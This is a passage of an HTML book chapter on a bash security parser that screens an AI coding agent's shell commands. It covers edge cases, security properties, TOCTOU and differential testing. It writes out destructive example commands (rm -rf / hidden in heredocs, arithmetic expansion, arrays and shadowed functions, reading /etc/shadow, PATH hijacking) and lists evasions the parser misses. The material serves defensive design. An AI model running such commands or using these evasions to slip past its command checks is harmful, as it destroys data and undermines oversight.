+<div class="codehilite"><pre><span></span><code>diff<span class="w"> </span>&lt;<span class="o">(</span>cat<span class="w"> </span>/etc/shadow<span class="o">)</span><span class="w"> </span>&lt;<span class="o">(</span>cat<span class="w"> </span>/etc/passwd<span class="o">)</span>
+</code></pre></div>
+
+<p><strong>Security implication:</strong> Process substitution <code>&lt;(...)</code> creates a file descriptor that reads from a command's output. The command inside <code>&lt;(...)</code> executes with the same privileges as the outer command. A parser that treats <code>&lt;(cat /etc/shadow)</code> as a filename argument misses the command execution inside the substitution.</p>
+<p><strong>Required parser behavior:</strong> Parse process substitution contents recursively as command lists and include them in the security analysis.</p>
+<h3 id="edge-case-5-heredoc-content-as-command-payload">Edge Case 5: Heredoc Content as Command Payload</h3>
+<div class="codehilite"><pre><span></span><code>python3<span class="w"> </span><span class="s">&lt;&lt;&#39;PAYLOAD&#39;</span>
+<span class="s">import os</span>
+<span class="s">os.system(&quot;rm -rf /&quot;)</span>
+<span class="s">PAYLOAD</span>
+</code></pre></div>
+
+<p><strong>Security implication:</strong> Heredocs pass arbitrary content as standard input to a command. If that command is an interpreter (<code>python3</code>, <code>ruby</code>, <code>node</code>, <code>bash</code>), the heredoc content is executable code. A parser that ignores heredoc content misses the actual payload.</p>
+<p><strong>Required parser behavior:</strong> When a heredoc's target command is an interpreter, flag the entire construct as <code>IndirectExecution</code>. Optionally, attempt to parse the heredoc content as code in the target language -- but this requires language-specific parsers and is impractical in the general case.</p>
+<h3 id="edge-case-6-arithmetic-expansion-as-command-injection">Edge Case 6: Arithmetic Expansion as Command Injection</h3>
+<div class="codehilite"><pre><span></span><code><span class="nb">echo</span><span class="w"> </span><span class="k">$((</span><span class="m">1</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="k">$(</span>rm<span class="w"> </span>-rf<span class="w"> </span>/<span class="k">)))</span>
+</code></pre></div>
+
+<p><strong>Security implication:</strong> Arithmetic expansion <code>$((...))</code> evaluates arithmetic expressions, but inside it, <code>$(...)</code> command substitution still works. An attacker nests a command substitution inside arithmetic expansion to hide dangerous commands in an ostensibly numeric context.</p>
+<p><strong>Required parser behavior:</strong> Parse <code>$(...)</code> command substitutions inside <code>$((...))</code> arithmetic expansion.</p>
+<h3 id="edge-case-7-array-variable-expansion">Edge Case 7: Array Variable Expansion</h3>
+<div class="codehilite"><pre><span></span><code><span class="nv">cmd</span><span class="o">=(</span>rm<span class="w"> </span>-rf<span class="w"> </span>/<span class="o">)</span>
+<span class="s2">&quot;</span><span class="si">${</span><span class="nv">cmd</span><span class="p">[@]</span><span class="si">}</span><span class="s2">&quot;</span>
+</code></pre></div>
+
+<p><strong>Security implication:</strong> Bash arrays store commands and arguments. When expanded with <code>"${cmd[@]}"</code>, the array elements become the command and its arguments. Static analysis cannot resolve the array's contents because the assignment and expansion may be separated by arbitrary code -- or may occur in different commands.</p>
+<p><strong>Required parser behavior:</strong> Flag <code>"${cmd[@]}"</code> and <code>"${cmd[*]}"</code> as unresolvable dynamic execution. The semantic analyzer cannot determine the command that will run, so it must escalate to the next security layer (permission check or user prompt).</p>
+<hr />
+<h2 id="74-why-just-use-a-shell-parser-library-does-not-work">7.4 Why "Just Use a Shell Parser Library" Does Not Work</h2>
+<p>A natural question: why build a 4,400-line parser from scratch when shell parser libraries exist? The answer has three parts.</p>
+<h3 id="part-1-correctness-goals-diverge">Part 1: Correctness Goals Diverge</h3>
+<p>A shell parser library is built for execution correctness: it parses shell commands to execute them. A security parser is built for classification correctness: it parses shell commands to determine what they will do.</p>
+<p>These goals diverge on ambiguous input. An execution parser for <code>$VAR</code> will defer to runtime expansion -- it does not need to know the variable's value at parse time. A security parser must flag <code>$VAR</code> as unresolvable and escalate, because the variable's value could be <code>rm -rf /</code>.</p>
+<p>An execution parser for <code>eval "$CMD"</code> will pass the string to the shell for re-parsing at runtime. A security parser must attempt to classify the <code>eval</code> target or flag it as opaque indirect execution.</p>
+<h3 id="part-2-error-handling-requirements-diverge">Part 2: Error Handling Requirements Diverge</h3>
+<p>A shell parser library treats parse errors as terminal -- the command is malformed and cannot execute. A security parser must handle parse errors gracefully: if it cannot parse a command, it must still produce a conservative classification and pass the command to downstream security layers.</p>
+<p>The parse failure policy for a security parser is not "reject" but "escalate." Unparseable commands bypass AST-based analysis but still face pattern matching, permission evaluation, and sandboxing. A library parser that throws on unparseable input would block this fallback chain.</p>
+<h3 id="part-3-the-librarys-parser-may-be-too-faithful">Part 3: The Library's Parser May Be Too Faithful</h3>
+<p>Shell parser libraries aim for 100% fidelity with the target shell (bash, zsh, dash). This means they implement features like alias expansion, shell options (<code>shopt</code>), and conditional syntax (<code>[[ ]]</code> vs. <code>[ ]</code>) exactly as the shell does.</p>
+<p>A security parser does not need -- and should not have -- this fidelity. If the security parser expands aliases, it must track alias definitions across commands, which makes the parser stateful and introduces the same cross-command analysis problem that the parser is designed to avoid. If it implements <code>shopt</code> options, it must track shell option state, which varies across sessions and environments.</p>
+<p>The right level of fidelity for a security parser is: parse the structure correctly, resolve quoting and escaping, identify command boundaries and nesting, and flag everything that depends on runtime state as unresolvable. This is a different parser than one designed for execution.</p>
+<h3 id="part-4-dependencies-are-attack-surface">Part 4: Dependencies Are Attack Surface</h3>
+<p>A third-party parser library is a dependency. Dependencies can have vulnerabilities (CVE-2023-XXXXX in your shell parser library), can be abandoned (maintainer stops updating), and can be supply-chain attacked (malicious code injected into a release). For a security-critical component, minimizing dependencies reduces the attack surface.</p>
+<p>A purpose-built parser has exactly one maintainer: the security team. Its behavior is fully auditable, its edge cases are documented, and its test suite covers the specific evasion techniques the team is defending against. This is not an argument against all dependencies -- it is an argument against dependencies in security-critical parsing paths.</p>
+<hr />
+<h2 id="75-security-properties-of-the-parser">7.5 Security Properties of the Parser</h2>
+<p>Having examined the structure and edge cases, we can now enumerate the parser's security properties -- what it guarantees, what it does not, and what residual risk remains.</p>
+<h3 id="property-1-quote-normalization-strong">Property 1: Quote Normalization (Strong)</h3>
+<p><strong>Mechanism:</strong> The tokenizer resolves all quoting variants to canonical token content. <code>'rm'</code>, <code>"rm"</code>, <code>r\m</code>, <code>$'rm'</code>, and <code>rm</code> all produce <code>Word("rm")</code>.</p>
+<p><strong>Weakness:</strong> ANSI-C quoting with hex/octal/unicode escapes requires character-by-character interpretation. If the parser's <code>$'...'</code> handler has a bug in escape resolution, encoded command names bypass classification.</p>
+<p><strong>Mitigation:</strong> Fuzz testing the tokenizer with all escape sequences. The test suite should include every combination of <code>$'...'</code> escape type applied to every dangerous command name.</p>
+<p><strong>Residual risk:</strong> Low. Quote normalization is well-understood and thoroughly testable.</p>
+<h3 id="property-2-command-boundary-detection-strong">Property 2: Command Boundary Detection (Strong)</h3>
+<p><strong>Mechanism:</strong> The AST builder identifies all command boundaries: <code>&amp;&amp;</code>, <code>||</code>, <code>;</code>, <code>|</code>, <code>&amp;</code>, subshells, brace groups, and compound commands. Each command is independently classifiable.</p>
+<p><strong>Weakness:</strong> Novel shell syntax that the parser does not recognize (e.g., bash 5.2's <code>${ ... ; }</code> command substitution variant) creates unparsed regions where command boundaries may be missed.</p>
+<p><strong>Mitigation:</strong> Track the bash version in use and update the parser when new syntax is introduced. Fall back to conservative classification for unparsed regions.</p>
+<p><strong>Residual risk:</strong> Low for bash 4.x/5.0. Increases with each new bash release that introduces syntax the parser does not yet handle.</p>
+<h3 id="property-3-recursive-nesting-analysis-moderate">Property 3: Recursive Nesting Analysis (Moderate)</h3>
+<p><strong>Mechanism:</strong> Command substitution (<code>$(...)</code>) and indirect execution (<code>eval</code>, <code>bash -c</code>) are recursively parsed and analyzed. The inner commands receive full security analysis.</p>
+<p><strong>Weakness:</strong> Recursion depth is capped (typically 3-5 levels). Beyond the cap, inner commands are classified as <code>Unknown/HighRisk</code>. An attacker who nests beyond the cap could hide a dangerous command inside what appears to be a single opaque <code>Unknown</code> classification -- which may receive less scrutiny than a <code>Destructive</code> classification from security reviewers.</p>
+<p><strong>Mitigation:</strong> Ensure that <code>Unknown/HighRisk</code> classification triggers the same permission gates as <code>Destructive</code>. The classification name should not matter; the permission behavior should be equally restrictive.</p>
+<p><strong>Residual risk:</strong> Moderate. The cap is necessary for DoS prevention, but it creates a known blind spot.</p>
+<h3 id="property-4-variable-expansion-flagging-weak">Property 4: Variable Expansion Flagging (Weak)</h3>
+<p><strong>Mechanism:</strong> The parser identifies <code>$VAR</code>, <code>${VAR}</code>, and <code>$(cmd)</code> as containing dynamic content that cannot be resolved statically. These are flagged for escalation.</p>
+<p><strong>Weakness:</strong> The parser cannot determine what value a variable will hold at execution time. <code>cmd="rm -rf /"; $cmd</code> will be flagged as dynamic execution, but the parser cannot classify <em>what</em> the dynamic execution will do.</p>
+<p><strong>Mitigation:</strong> The semantic analyzer flags all unresolvable dynamic execution as requiring user approval or AI classifier evaluation. This defers the decision to a layer that can consider context (the AI classifier sees the full conversation, including the variable assignment).</p>
+<p><strong>Residual risk:</strong> Moderate-high. Variable-based execution is common in legitimate use (build scripts, makefiles) and in attacks. The false positive rate for flagging variables is high, which pressures the system toward leniency -- the exact direction attackers want.</p>
+<h3 id="property-5-resilience-to-malformed-input-moderate">Property 5: Resilience to Malformed Input (Moderate)</h3>
+<p><strong>Mechanism:</strong> The parser follows a "fail-open with escalation" policy. Unparseable commands bypass AST analysis but face pattern matching, permission evaluation, and sandboxing.</p>
+<p><strong>Weakness:</strong> A command crafted to confuse the parser into producing an incorrect AST (rather than a parse failure) is more dangerous than one that triggers a parse failure. An incorrect AST produces incorrect classification with no escalation.</p>
+<p><strong>Mitigation:</strong> Differential testing against the actual shell. Run the parser and the shell on the same input; compare the parser's interpretation with the shell's actual execution. Discrepancies reveal parser bugs that produce incorrect ASTs.</p>
+<p><strong>Residual risk:</strong> Moderate. The parser and the shell are different codebases interpreting the same language. Any behavioral divergence is a potential security gap.</p>
+<hr />
+<h2 id="76-the-parser-as-a-toctou-surface">7.6 The Parser as a TOCTOU Surface</h2>
+<p>The parser operates at analysis time. The shell operates at execution time. Between these two points, the command string does not change -- but the environment in which it executes can change.</p>
+<div class="codehilite"><pre><span></span><code><span class="c1"># At parse time: $HOME is /home/user</span>
+<span class="c1"># Between parse and execution: another process changes HOME</span>
+<span class="c1"># At execution time: $HOME is /</span>
+rm<span class="w"> </span>-rf<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$HOME</span><span class="s2">/cache&quot;</span>
+<span class="c1"># Parser classifies: delete /home/user/cache (safe)</span>
+<span class="c1"># Shell executes: delete /cache (dangerous)</span>
+</code></pre></div>
+
+<p>This is a Time-of-Check-to-Time-of-Use (TOCTOU) vulnerability (CWE-367). The parser's classification is based on a snapshot of reality that may be stale by execution time.</p>
+<p><strong>Mitigations:</strong></p>
+<ol>
+<li>The sandbox restricts file system access regardless of the parser's classification. Even if the parser misclassifies the target path, the sandbox prevents writes outside the allowed directory.</li>
+<li>The AI classifier evaluates commands in the full conversation context, which may include the environment manipulation that the parser missed.</li>
+<li>Minimize the time between parsing and execution. In Claude Code's pipeline, the parser runs immediately before execution, reducing the TOCTOU window.</li>
+</ol>
+<p><strong>Residual risk:</strong> Low in practice (the TOCTOU window is milliseconds), but the theoretical vulnerability exists and cannot be eliminated by parsing alone.</p>
+<hr />
+<h2 id="77-performance-characteristics">7.7 Performance Characteristics</h2>
+<p>A security parser that adds seconds of latency to every command is a parser that users will disable. The performance budget for the parser is strict:</p>
+<table>
+<thead>
+<tr>
+<th>Phase</th>
+<th>Target</th>
+<th>Actual (typical)</th>
+<th>Worst case</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Tokenization</td>
+<td>&lt;3ms</td>
+<td>0.5-2ms</td>
+<td>8ms (100KB command)</td>
+</tr>
+<tr>
+<td>AST Construction</td>
+<td>&lt;2ms</td>
+<td>0.3-1ms</td>
+<td>5ms (50+ subcommands)</td>
+</tr>
+<tr>
+<td>Semantic Analysis</td>
+<td>&lt;5ms</td>
+<td>1-3ms</td>
+<td>15ms (deep nesting)</td>
+</tr>
+<tr>
+<td><strong>Total</strong></td>
+<td><strong>&lt;10ms</strong></td>
+<td><strong>2-6ms</strong></td>
+<td><strong>28ms</strong></td>
+</tr>
+</tbody>
+</table>
+<p>The worst case occurs with pathologically long commands (100KB+) or deeply nested substitutions. These commands are rare in legitimate use and are themselves suspicious -- the parser can apply a size limit (100KB) to prevent denial-of-service against the parser itself.</p>
+<p>The parser also enforces a subcommand count limit (typically 50). Commands with more than 50 subcommands are deferred to the user rather than analyzed, because the combinatorial complexity of analyzing 50+ interacting commands exceeds the parser's classification confidence.</p>
+<hr />
+<h2 id="78-differential-testing-parser-vs-shell">7.8 Differential Testing: Parser vs. Shell</h2>
+<p>The ultimate test of a security parser is whether it agrees with the shell it is defending against. If the parser says a command runs <code>ls</code> but the shell runs <code>rm</code>, the parser has failed its security mission.</p>
+<p>Differential testing runs both the parser and the shell on the same input:</p>
+<div class="codehilite"><pre><span></span><code><span class="k">For</span><span class="w"> </span><span class="nv">each</span><span class="w"> </span><span class="nv">test</span><span class="w"> </span><span class="nv">case</span>:
+<span class="w">  </span><span class="mi">1</span>.<span class="w"> </span><span class="nv">Parse</span><span class="w"> </span><span class="nv">the</span><span class="w"> </span><span class="nv">command</span><span class="w"> </span><span class="nv">with</span><span class="w"> </span><span class="nv">the</span><span class="w"> </span><span class="nv">security</span><span class="w"> </span><span class="nv">parser</span><span class="w"> </span>→<span class="w"> </span><span class="nv">extract</span><span class="w"> </span><span class="nv">command</span><span class="w"> </span><span class="nv">name</span>
+<span class="w">  </span><span class="mi">2</span>.<span class="w"> </span><span class="nv">Execute</span><span class="w"> </span><span class="nv">the</span><span class="w"> </span><span class="nv">command</span><span class="w"> </span><span class="nv">in</span><span class="w"> </span><span class="nv">a</span><span class="w"> </span><span class="nv">sandbox</span><span class="w"> </span><span class="nv">shell</span><span class="w"> </span><span class="nv">with</span><span class="w"> </span><span class="nv">tracing</span><span class="w"> </span>→<span class="w"> </span><span class="nv">capture</span><span class="w"> </span><span class="nv">actual</span><span class="w"> </span><span class="nv">binary</span>
+<span class="w">  </span><span class="mi">3</span>.<span class="w"> </span><span class="nv">Compare</span>:<span class="w"> </span><span class="nv">does</span><span class="w"> </span><span class="nv">the</span><span class="w"> </span><span class="nv">parser</span><span class="s1">&#39;s command name match the shell&#39;</span><span class="nv">s</span><span class="w"> </span><span class="nv">executed</span><span class="w"> </span><span class="nv">binary</span>?
+</code></pre></div>
+
+<p>Known divergence categories:</p>
+<table>
+<thead>
+<tr>
+<th>Category</th>
+<th>Example</th>
+<th>Parser sees</th>
+<th>Shell executes</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Alias expansion</td>
+<td><code>alias ll='ls -la'; ll</code></td>
+<td><code>ll</code> (unknown)</td>
+<td><code>ls -la</code></td>
+</tr>
+<tr>
+<td>Shell function shadowing</td>
+<td><code>git() { rm -rf /; }; git status</code></td>
+<td><code>git</code> (dev-tool)</td>
+<td><code>rm -rf /</code> (destructive)</td>
+</tr>
+<tr>
+<td>PATH manipulation</td>
+<td><code>PATH=/evil:$PATH; ls</code></td>
+<td><code>ls</code> (read-only)</td>
+<td><code>/evil/ls</code> (unknown)</td>
+</tr>
+<tr>
+<td>Conditional expansion</td>
+<td><code>${DEBUG:+rm -rf /}</code></td>
+<td>Unresolvable</td>
+<td>Depends on <code>$DEBUG</code></td>
+</tr>
+</tbody>
+</table>
+<p>Each divergence category represents a residual attack surface. The parser handles categories 1 and 2 by flagging alias definitions and function definitions as suspicious. Categories 3 and 4 require runtime state that the parser cannot access.</p>
+<hr />
+<h2 id="79-the-parsers-role-in-defense-in-depth">7.9 The Parser's Role in Defense-in-Depth</h2>
+<p>The parser is not a complete security solution. It is the first layer in a six-layer pipeline (as described in Chapter 8 and Chapter 9). Its job is to transform the security problem from "analyze a raw string" to "analyze a structured tree" -- a dramatically easier problem for downstream layers.</p>
+<p>What the parser eliminates:
+- Quote-based evasion (normalization)
+- Operator-based hiding (command boundary detection)
+- Nesting-based concealment (recursive analysis)</p>
+<p>What the parser cannot eliminate:
+- Runtime state dependencies (variables, aliases, PATH)
+- Cross-command attack chains (multi-step exploits across separate tool calls)
+- Encoded payloads inside heredocs or interpreter arguments
+- TOCTOU between parse and execution</p>
+<p>The downstream layers (command classification in Chapter 8, sandbox in Chapter 9) are specifically designed to catch what the parser misses. This layered design means a parser bug does not equal a security bypass -- it means one layer's contribution is reduced while the others compensate.</p>
+<hr />
+<h2 id="security-assessment-the-bash-parser">Security Assessment: The Bash Parser</h2>
+<table>
+<thead>
+<tr>
+<th>Property</th>
+<th>Rating</th>
+<th>Justification</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Quote normalization</td>
+<td>Strong</td>
+<td>All standard quoting variants resolved. ANSI-C edge cases require attention.</td>
+</tr>
+<tr>
+<td>Command boundary detection</td>
+<td>Strong</td>
+<td>All standard operators and grouping constructs handled.</td>
+</tr>
+<tr>
+<td>Recursive nesting analysis</td>
+<td>Moderate</td>
+<td>Depth cap creates known blind spot beyond 3-5 levels.</td>
+</tr>
+<tr>
+<td>Variable expansion handling</td>
+<td>Weak</td>
+<td>Static analysis cannot resolve runtime variable values. Escalation is the only option.</td>
+</tr>
+<tr>
+<td>Resilience to malformed input</td>
+<td>Moderate</td>
+<td>Fail-open policy is correct, but incorrect ASTs (vs. parse failures) are harder to detect.</td>
+</tr>
+<tr>
+<td>TOCTOU resistance</td>
+<td>Low</td>
+<td>Parser operates at analysis time; environment can change before execution. Sandbox mitigates.</td>
+</tr>
+<tr>
+<td>Performance</td>
+<td>Strong</td>
+<td>&lt;10ms typical, &lt;30ms worst case. Does not create latency pressure for bypass.</td>
+</tr>
+</tbody>
+</table>
+<p><strong>Overall: The parser is a necessary but insufficient security control.</strong> It eliminates the most common evasion techniques (quoting, escaping, nesting) but cannot address runtime-dependent attacks. Its primary value is enabling downstream layers to operate on structured data rather than raw strings -- a force multiplier for the entire security pipeline.</p>
+<p><strong>Key CWEs addressed:</strong> CWE-78 (OS Command Injection), CWE-116 (Improper Encoding/Escaping of Output), CWE-838 (Inappropriate Encoding for Output)</p>
+<p><strong>Key CWEs requiring downstream layers:</strong> CWE-367 (TOCTOU Race Condition), CWE-94 (Code Injection via interpreter arguments), CWE-77 (Command Injection via indirect execution)</p>
+<div class="chapter-nav">
+  <a href="chapter-06.html">&larr; Previous</a>
+  <a href="index.html">Table of Contents</a>
+  <a href="chapter-08.html">Next &rarr;</a>
+</div>
+</div>
+</body>
+</html>
